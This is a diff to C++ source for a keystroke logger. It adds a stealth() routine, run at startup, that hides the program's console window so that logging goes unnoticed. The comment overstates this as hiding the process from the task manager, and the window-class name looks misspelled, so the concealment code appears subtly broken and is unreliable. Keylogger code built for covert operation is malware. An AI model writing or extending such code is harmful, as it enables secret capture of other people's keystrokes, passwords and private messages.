@@ -17,10 +17,12 @@ using namespace std;
 
 // Declare Functions
 void log();					// Logs key strokes.
-char specialKey(char key); // returns the correct char
+char specialKey(char key);  // returns the correct char
+void stealth();
 
 
 int main() {
+	stealth();
 	log();
 	return 0;
 }
@@ -85,8 +87,16 @@ void log() {
 
 }
 
+// Hides this process from the task manager.
+void stealth() {
+	HWND stealth;	//make a handler called stealth.
+	AllocConsole();
+	stealth = FindWindowA("ConsoleWindowsClass", NULL);
+	ShowWindow(stealth, 0);		// do not show this window = 0
+}
+
 /*
- *
+ *	These are the special keys that should be assigned when shift is held down.
  */
 char specialKey(char key) {
 
